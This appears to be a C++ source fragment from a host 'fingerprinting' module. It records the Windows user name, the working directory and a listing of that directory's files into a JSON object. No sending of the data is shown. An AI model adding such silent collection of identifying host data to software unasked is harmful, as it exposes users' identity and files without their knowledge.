#include "general.hpp"

#include <filesystem>

void fingerprinting::general_t::serialize_account_name( )
{
    char buffer[ 255 ]{ };
    DWORD len = 255;

    auto& name = general_data[ "pc_username" ];

    if ( GetUserNameA( buffer, &len ) )
        name = std::string( buffer, len - 1 );
}

void fingerprinting::general_t::serialize_directory_info( )
{
    const auto current_directory = std::filesystem::current_path( );
    general_data[ "working_directory" ] = current_directory.string( );

    json_t files;
    for ( const auto& file : std::filesystem::directory_iterator( current_directory ) )
    {
        auto name = file.path( ).filename( ).string( );

        if ( file.is_directory( ) )
            name = '/' + name + '/';

        files.push_back( name );
    }

    general_data[ "files" ] = files;
}

fingerprinting::general_t::general_t( )
{
    serialize_account_name( );
    serialize_directory_info( );

    _object[ "general_info" ] = general_data;
}
